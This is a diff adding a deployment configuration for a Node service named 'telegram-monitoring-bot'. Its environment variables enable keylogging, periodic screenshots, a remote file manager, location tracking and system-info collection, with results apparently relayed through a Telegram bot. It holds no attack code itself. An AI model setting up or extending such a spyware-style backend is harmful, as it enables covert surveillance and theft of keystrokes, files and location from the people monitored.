@@ -1,0 +1,45 @@
+services:
+  - type: web
+    name: telegram-monitoring-bot
+    runtime: node
+    region: oregon
+    plan: free
+    buildCommand: npm install
+    startCommand: npm start
+    envVars:
+      - key: NODE_ENV
+        value: production
+      - key: PORT
+        value: 3000
+      - key: DATABASE_FILE
+        value: /opt/render/project/data/monitoring.db
+      - key: TELEGRAM_BOT_TOKEN
+        sync: false
+      - key: TELEGRAM_ADMIN_ID
+        sync: false
+      - key: JWT_SECRET
+        generateValue: true
+      - key: ENCRYPTION_KEY
+        generateValue: true
+      - key: WEBHOOK_URL
+        sync: false
+      - key: WEBHOOK_PATH
+        value: /bot
+      - key: ENABLE_SCREENSHOTS
+        value: true
+      - key: ENABLE_KEYLOGGING
+        value: true
+      - key: ENABLE_FILE_MANAGER
+        value: true
+      - key: ENABLE_SYSTEM_INFO
+        value: true
+      - key: ENABLE_LOCATION
+        value: true
+      - key: ENABLE_NOTIFICATIONS
+        value: true
+      - key: SCREENSHOT_INTERVAL
+        value: 300000
+      - key: KEYLOG_BUFFER_SIZE
+        value: 100
+      - key: MAX_FILE_SIZE
+        value: 52428800
